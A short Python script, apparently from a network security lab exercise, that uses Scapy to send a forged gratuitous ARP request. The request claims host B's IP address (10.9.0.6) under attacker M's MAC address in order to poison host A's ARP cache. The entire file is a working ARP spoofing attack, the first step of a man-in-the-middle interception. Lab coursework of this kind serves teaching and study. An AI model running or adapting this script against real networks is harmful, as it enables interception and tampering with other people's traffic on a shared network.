#!/usr/bin/env python3
from scapy.all import *

def send_gratuitous_arp(target_ip, fake_ip, fake_mac):
    ether = Ether(dst="ff:ff:ff:ff:ff:ff", src=fake_mac)
    arp = ARP(hwsrc=fake_mac, psrc=fake_ip, pdst=target_ip, op=1)  # ARP request (op=1)
    pkt = ether/arp
    sendp(pkt)

# Scenario 1: B’s IP is already in A’s cache.
target_ip_a = "10.9.0.5"  # Replace with A's IP address
fake_ip_m = "10.9.0.6"  # Replace with B's IP address
fake_mac_m = "02:42:0a:09:00:69"  # Replace with M's MAC address

send_gratuitous_arp(target_ip_a, fake_ip_m, fake_mac_m)
